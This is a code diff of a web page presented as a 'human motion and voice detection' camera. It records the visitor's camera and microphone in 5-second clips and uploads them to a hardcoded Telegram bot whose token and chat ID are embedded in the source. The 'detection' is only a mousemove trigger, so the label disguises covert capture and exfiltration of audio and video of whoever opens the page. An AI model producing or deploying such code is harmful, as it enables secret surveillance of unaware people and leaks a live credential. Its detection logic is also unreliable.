@@ -3,78 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Human Motion Detection</title>
+    <title>Advanced Human Motion & Voice Detection</title>
     <style>
         body { text-align: center; background-color: #222; color: white; }
         video { width: 100%; max-width: 500px; border: 5px solid red; }
-        canvas { display: none; }
     </style>
 </head>
 <body>
-    <h1>Human Motion Detection Camera</h1>
+    <h1>Human Motion & Voice Detection</h1>
     <video id="video" autoplay></video>
-    <canvas id="canvas"></canvas>
     <script>
         const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
-        const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk';
+        const TELEGRAM_BOT_TOKEN = '7785386019:AAHN8h2fje-njjcvAUUftx6TjJFE7rB4lvk';
         const CHAT_ID = '8101021767';
         let humanDetected = false;
         
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => video.srcObject = stream)
-            .catch(err => console.error("Error accessing camera:", err));
-        
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                video.srcObject = stream;
+                startRecording(stream);
+            })
+            .catch(err => console.error("Error accessing camera/microphone:", err));
+
+        function startRecording(stream) {
+            let mediaRecorder = new MediaRecorder(stream);
+            let chunks = [];
+            
+            mediaRecorder.ondataavailable = event => chunks.push(event.data);
+            
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                sendVideo(blob);
+                chunks = [];
+            };
+            
+            setInterval(() => {
+                if (!humanDetected) return;
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            }, 5000);
+        }
+
         function detectHuman() {
-            if (video.videoWidth === 0 || video.videoHeight === 0) return;
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            humanDetected = true;
+            setTimeout(() => humanDetected = false, 10000); // Reset after 10s
+        }
+        
+        function sendVideo(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', blob, 'motion_detected.webm');
             
-            const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-            let motion = analyzeMotion(imageData);
-            
-            if (motion > 5000) { // Adjust motion threshold
-                if (!humanDetected) {
-                    sendImage();
-                    humanDetected = true;
-                    setTimeout(() => humanDetected = false, 5000); // Prevent spam
-                }
-            }
-            requestAnimationFrame(detectHuman);
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log("Video sent:", data))
+            .catch(err => console.error("Error sending video:", err));
         }
         
-        function analyzeMotion(imageData) {
-            let motionValue = 0;
-            for (let i = 0; i < imageData.data.length; i += 4) {
-                let r = imageData.data[i];
-                let g = imageData.data[i + 1];
-                let b = imageData.data[i + 2];
-                if (r > 100 && g > 100 && b > 100) { // Basic human skin tone detection
-                    motionValue++;
-                }
-            }
-            return motionValue;
-        }
-        
-        function sendImage() {
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'human_detected.jpg');
-                
-                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => response.json())
-                .then(data => console.log("Human detected, image sent:", data))
-                .catch(err => console.error("Error sending image:", err));
-            }, 'image/jpeg');
-        }
-        
-        detectHuman(); // Start detection loop
+        document.body.addEventListener('mousemove', detectHuman);
     </script>
 </body>
 </html>
